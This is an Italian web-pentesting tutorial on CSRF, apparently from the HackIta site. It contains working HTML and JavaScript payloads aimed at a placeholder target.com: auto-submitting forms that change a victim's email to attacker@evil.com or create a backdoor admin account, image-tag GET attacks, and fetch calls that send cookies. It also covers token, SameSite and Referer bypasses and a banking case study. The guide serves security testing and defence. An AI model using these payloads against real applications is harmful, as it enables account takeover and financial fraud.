---
title: 'CSRF Attack: Token, SameSite e Bypass Reali'
slug: csrf
description: >-
  Scopri come individuare e testare un CSRF attack nel pentesting web: PoC HTML,
  bypass token, SameSite, API JSON e account takeover.
image: /csrf.webp
draft: false
date: 2026-03-14T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - csrf
---

Il *CSRF* è un attacco invisibile: la vittima visita una pagina dell'attaccante (o un'email con un'immagine, o un forum con un post malevolo), il suo browser **esegue automaticamente una request verso l'applicazione target** includendo i cookie di sessione. L'applicazione target riceve una request autenticata e la esegue: cambia l'email dell'utente, trasferisce fondi, crea un account admin. La vittima non ha cliccato nulla — il browser ha fatto tutto in background.

È un attacco che molti considerano "risolto" grazie a `SameSite=Lax` (default nei browser moderni dal 2020). Ma `SameSite=Lax` protegge solo le request POST cross-site — non protegge dalle GET con side effect, non protegge se `SameSite=None` è impostato esplicitamente, e non protegge se l'applicazione usa un redirect chain che rende la request "same-site". Nei pentest lo trovo ancora regolarmente — specialmente nelle intranet aziendali, nelle applicazioni legacy, e nelle API che accettano `Content-Type: text/plain`.

Satellite della [guida pillar Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa). Vedi anche: [Session Hijacking](https://hackita.it/articoli/session-hijacking), [Clickjacking](https://hackita.it/articoli/clickjacking).

Riferimenti: [PortSwigger CSRF](https://portswigger.net/web-security/csrf), [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).

***

## Come Funziona — Il Flusso Dell'Attacco

```
1. Vittima è autenticata su target.com (cookie di sessione nel browser)
2. Vittima visita evil.com (o apre un'email, o legge un forum)
3. evil.com contiene HTML/JS che fa una request a target.com
4. Il browser include automaticamente i cookie di target.com
5. target.com riceve la request → è autenticata → la esegue
6. L'azione è compiuta: email cambiata, fondi trasferiti, admin creato
7. La vittima non ha visto nulla
```

***

## Detection — Verificare Se L'App È Vulnerabile

### Checklist veloce (2 minuti)

```bash
# 1. Il form/endpoint ha un CSRF token?
# Cerca nel form HTML: <input type="hidden" name="csrf_token" value="...">
# Cerca negli header: X-CSRF-Token, X-XSRF-Token

# 2. Il cookie ha SameSite?
curl -sI "https://target.com" | grep -i "samesite"
# SameSite=Strict → protetto (cross-site POST e GET bloccati)
# SameSite=Lax → parzialmente protetto (POST bloccati, GET permessi)
# SameSite=None → NON protetto
# Assente → dipende dal browser (Chrome default = Lax, ma non tutti)

# 3. Il server verifica Origin/Referer?
# Invia la request senza header Origin/Referer → funziona?
# Invia con Origin: https://evil.com → funziona?
```

### Test Di Validazione Token CSRF

```bash
# In Burp Repeater — su un'azione sensibile (cambio email, password, ecc.):

# Test 1: rimuovi il token CSRF completamente
# Se la request funziona senza token → CSRF possibile!

# Test 2: invia un token vuoto
csrf_token=
# Se funziona → il server non valida

# Test 3: invia un token random
csrf_token=AAAAAAAAAA
# Se funziona → il server non valida

# Test 4: usa il token di un ALTRO utente
# Login come UserA → copia il CSRF token
# Login come UserB → usa il token di UserA
# Se funziona → token non legato alla sessione

# Test 5: token statico?
# Fai 3 request → il token è sempre lo stesso?
# Se sì → attaccante può riusarlo

# Test 6: il token è nel cookie (Double Submit Cookie)?
# Se il CSRF token è SOLO un cookie (senza campo hidden nel form)
# → L'attaccante può impostare il cookie via subdomain
```

***

## Exploitation — PoC CSRF

### Form Auto-Submit (POST classico)

```html
<!-- evil.com — la vittima visita questa pagina -->
<!DOCTYPE html>
<html>
<body>
  <h1>Congratulazioni! Hai vinto un premio!</h1>
  <!-- Form nascosto che si auto-invia -->
  <form action="https://target.com/api/account/email" method="POST" id="csrf">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.getElementById('csrf').submit();</script>
  <!-- La vittima vede "hai vinto un premio"
       Il browser invia il form a target.com con i cookie della vittima
       L'email dell'account viene cambiata a attacker@evil.com
       L'attaccante fa password reset → account takeover -->
</body>
</html>
```

### IMG Tag (GET con side effect)

```html
<!-- Se l'azione è eseguita via GET (errore di design): -->
<img src="https://target.com/api/account/delete?confirm=true" width="0" height="0" />
<!-- Il browser carica l'immagine → esegue la GET → account cancellato -->

<!-- Trasferimento via GET (applicazioni banking legacy): -->
<img src="https://target.com/transfer?to=ATTACKER_IBAN&amount=10000" />
```

### CSRF su API JSON (il caso moderno)

```html
<!-- Le API moderne usano JSON → Content-Type: application/json -->
<!-- Il browser non invia JSON cross-origin con form standard -->
<!-- MA: molti server accettano anche Content-Type: text/plain -->

<script>
fetch('https://target.com/api/v2/account/email', {
  method: 'POST',
  credentials: 'include',    // Invia i cookie!
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>

<!-- Se il server accetta text/plain come JSON → CSRF funziona! -->
```

### CSRF Per Creare Admin Backdoor

```html
<form action="https://target.com/api/admin/users/create" method="POST" id="csrf">
  <input type="hidden" name="username" value="backdoor_admin" />
  <input type="hidden" name="password" value="Hacked!2026" />
  <input type="hidden" name="role" value="admin" />
</form>
<script>document.getElementById('csrf').submit();</script>
<!-- Se la vittima è admin → crea un account admin per l'attaccante -->
```

### Burp CSRF PoC Generator

```
1. In Burp: seleziona la request vulnerabile
2. Click destro → "Engagement tools" → "Generate CSRF PoC"
3. Burp genera automaticamente l'HTML con il form pre-compilato
4. "Copy HTML" → salva come .html → serve alla vittima
5. Opzioni: auto-submit, include script, cross-origin
```

***

## Bypass — Quando C'è Un Token Ma Non Funziona Bene

### Token Presente Ma Non Validato (il classico)

```bash
# Il form ha il campo csrf_token MA il server NON lo controlla
# Come verificare:
# Rimuovi csrf_token dalla request → se 200 OK → non validato!

# Oppure: manda un token di 1 carattere
csrf_token=x → 200 OK? → non validato!
```

### Token Legato Al Metodo Ma Non Al Path

```bash
# Il CSRF token protegge POST /change-email
# Ma NON protegge PUT /change-email → usa PUT!
```

### Double Submit Cookie Bypass

```bash
# Se il CSRF token è un cookie che deve matchare un campo nel body:
# Cookie: csrf=abc123
# Body: csrf_token=abc123

# L'attaccante imposta il cookie via subdomain (cookie tossing):
# Se controlla qualsiasi subdomain di target.com:
document.cookie = "csrf=ATTACKER_VALUE; domain=.target.com"
# Poi invia il form con csrf_token=ATTACKER_VALUE
# Cookie e body matchano → CSRF bypass!
```

### SameSite=Lax Bypass

```bash
# SameSite=Lax permette cross-site GET (ma non POST)
# Se l'applicazione accetta GET per azioni sensibili:
<a href="https://target.com/api/account/delete">Click here</a>
# Il browser include i cookie per la navigazione top-level!

# Method override: se il server accetta _method parameter:
<form action="https://target.com/api/account/email?_method=POST" method="GET">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
# La request è GET (bypassa SameSite=Lax) ma il server la tratta come POST

# Redirect chain:
# Se target.com ha un open redirect:
# https://target.com/redirect?url=https://target.com/api/sensitive-action
# La request finale è "same-site" (arriva da target.com)
```

### Referer/Origin Bypass

```bash
# Se il server verifica il Referer header:
# Usa meta tag per non inviare Referer:
<meta name="referrer" content="no-referrer">
<form action="https://target.com/api/action" method="POST">...</form>
# Il server riceve una request SENZA Referer → se accetta request senza Referer → bypass!

# Se il server verifica che il Referer CONTIENE il dominio target:
# Il tuo dominio: evil-target.com (contiene "target")
# O: evil.com/target.com/csrf.html (il path contiene "target.com")
# Referer: https://evil.com/target.com/csrf.html → il check regex passa!
```

***

## Output Reale — CSRF → Account Takeover

### Cambio Email Via CSRF

```bash
# La request vulnerabile (in Burp):
POST /api/account/settings HTTP/1.1
Host: target.com
Cookie: session=VICTIM_SESSION
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com

# Nessun CSRF token nella request!
# PoC HTML creato con Burp CSRF PoC Generator
# Vittima visita la pagina → email cambiata

# Verifica:
# attacker@evil.com riceve email di conferma cambio
# L'attaccante fa password reset → nuovo link al suo email
# Login con nuova password → ACCOUNT TAKEOVER
```

### Creazione Admin Backdoor

```bash
# La vittima (admin) visita evil.com con il PoC CSRF:
POST /admin/users/create HTTP/1.1
Host: target.com
Cookie: session=ADMIN_SESSION
Content-Type: application/x-www-form-urlencoded

username=backdoor&password=H4cked!2026&role=admin

# Response: 302 Redirect (utente creato)
# L'attaccante fa login con backdoor:H4cked!2026
# → Accesso admin permanente (anche dopo fix del CSRF)
```

***

## Workflow Reale — CSRF Pentest

### Step 1 → Identifica le azioni sensibili

```bash
# Mappale in Burp:
# - Cambio email
# - Cambio password
# - Trasferimenti / pagamenti
# - Creazione utenti
# - Modifica permessi
# - Cancellazione account
# - Connessione servizi OAuth
```

### Step 2 → Verifica protezioni CSRF

```bash
# Per ogni azione sensibile:
# 1. CSRF token presente nel form/header?
# 2. Token validato? (rimuovi → funziona?)
# 3. SameSite cookie flag?
# 4. Origin/Referer check?
```

### Step 3 → Se non protetta → genera PoC

```bash
# Burp: click destro → Generate CSRF PoC
# O: crea manualmente il form HTML
```

### Step 4 → Se token presente → testa bypass

```bash
# Rimuovi token, token random, token cross-user, token statico
# Double submit cookie → cookie tossing
# SameSite=Lax → method override, GET side effect
```

### Step 5 → Documenta l'impatto

```bash
# CSRF su cambio email → account takeover → CRITICAL
# CSRF su crea admin → persistent backdoor → CRITICAL
# CSRF su profilo → modifica dati → MEDIUM
# CSRF su like/commento → nuisance → LOW
```

***

## Enterprise Escalation

### CSRF → Email Change → Account Takeover Massivo

```
Pagina con CSRF PoC inviata via email phishing a 500 dipendenti
→ 50 dipendenti visitano il link
→ 50 email cambiate a attacker@evil.com
→ Password reset per tutti → 50 account compromessi
→ Inclusi 3 admin → accesso completo
→ MASS ACCOUNT TAKEOVER via phishing + CSRF
```

### CSRF → Admin Backdoor → Persistent Access

```
Admin visita forum interno con post contenente CSRF PoC
→ Account admin "backdoor" creato automaticamente
→ L'attaccante accede con l'account backdoor
→ Anche dopo il fix del CSRF → l'account backdoor esiste ancora
→ PERSISTENT ADMIN ACCESS
```

### CSRF + Stored XSS → Worm Aziendale

```
Stored XSS con CSRF PoC che si auto-replica:
→ Utente A visita la pagina → CSRF modifica il profilo di A
→ Il profilo di A ora contiene la stessa XSS
→ Utente B visita il profilo di A → il suo profilo viene modificato
→ Propagazione esponenziale → TUTTI i profili compromessi
```

***

## Caso Studio Concreto

**Settore:** Piattaforma bancaria online, 100.000 clienti.
**Scope:** Grey-box.

L'endpoint `POST /api/beneficiaries/add` (aggiungi beneficiario per trasferimenti) **non aveva CSRF token** e il cookie aveva `SameSite=None` (necessario per integrazione con app mobile). Ho creato un PoC HTML che aggiungeva silenziosamente il mio IBAN alla lista beneficiari della vittima. Secondo PoC per `POST /api/transfers/initiate` → trasferimento di 500€ al mio beneficiario appena aggiunto.

La chain completa: la vittima visita una pagina → il primo CSRF aggiunge il beneficiario → redirect → il secondo CSRF inizia il trasferimento. Due request automatiche, zero interazione visibile per la vittima.

La banca ha controbattuto: "serve l'OTP per confermare il trasferimento". Vero — ma l'aggiunta del beneficiario **non richiedeva OTP**. E una volta aggiunto, il beneficiario appariva come "verificato" dopo 24h. Impatto ridotto ma presente: l'attaccante prepara il terreno, la vittima conferma un trasferimento "legittimo" al beneficiario che non sa di aver aggiunto.

**Tempo:** 10 minuti per la discovery, 5 per il PoC, catena completa dimostrata.

***

## Errori Comuni

**"Abbiamo il CSRF token nel form"** — Ma lo validate? Nel 30% dei casi che incontro, il token c'è nel form ma il server non lo controlla.

**"SameSite=Lax ci protegge"** — Dai POST cross-site sì. Ma GET con side effect, method override, e redirect chain bypassano Lax.

**"Le nostre API usano JSON, il CSRF non è possibile"** — Se il server accetta anche `text/plain` come Content-Type (e molti lo fanno), il CSRF via fetch con `credentials: 'include'` funziona.

**"Il token CSRF è nel cookie"** — Double Submit Cookie senza validazione server-side è bypassabile con cookie tossing se l'attaccante controlla un subdomain.

***

## ✅ Checklist CSRF

```
DETECTION
☐ Azioni sensibili mappate (email, password, transfer, create user)
☐ CSRF token presente nel form/header per ogni azione?
☐ SameSite flag nel cookie analizzato (Strict/Lax/None/assente)
☐ Origin/Referer verificati dal server?

TOKEN VALIDATION
☐ Request senza token → funziona? (token non richiesto)
☐ Token vuoto → funziona? (non validato)
☐ Token random → funziona? (non validato)
☐ Token di altro utente → funziona? (non legato alla sessione)
☐ Token statico (non cambia)? → riusabile
☐ Double Submit Cookie → cookie tossing possibile?

SAMESITE BYPASS
☐ GET con side effect testato (se SameSite=Lax)
☐ Method override (?_method=POST) testato
☐ Redirect chain via open redirect testata
☐ SameSite=None presente? → nessuna protezione

CONTENT-TYPE (API)
☐ API accetta text/plain come JSON? → CSRF via fetch
☐ API accetta application/x-www-form-urlencoded? → CSRF via form

REFERER/ORIGIN BYPASS
☐ Request senza Referer (<meta no-referrer>) → accettata?
☐ Referer con dominio attaccante contenente "target" → match?

POC
☐ HTML PoC generato (Burp o manuale)
☐ Auto-submit testato
☐ Impatto documentato (cambio email → ATO, crea admin → persistence)
```

***

Riferimenti: [PortSwigger CSRF labs](https://portswigger.net/web-security/csrf), [OWASP CSRF Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery), [HackTricks CSRF](https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html).

Satellite della [Guida Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa). Vedi anche: [Session Hijacking](https://hackita.it/articoli/session-hijacking), [Clickjacking](https://hackita.it/articoli/clickjacking), [XSS](https://hackita.it/articoli/xss).

> Il tuo CSRF token è validato? Le API accettano `text/plain`? Il cookie ha `SameSite=None`? [Penetration test HackIta](https://hackita.it/servizi) per ogni falla CSRF. Dal PoC all'account takeover: [formazione 1:1](https://hackita.it/formazione).
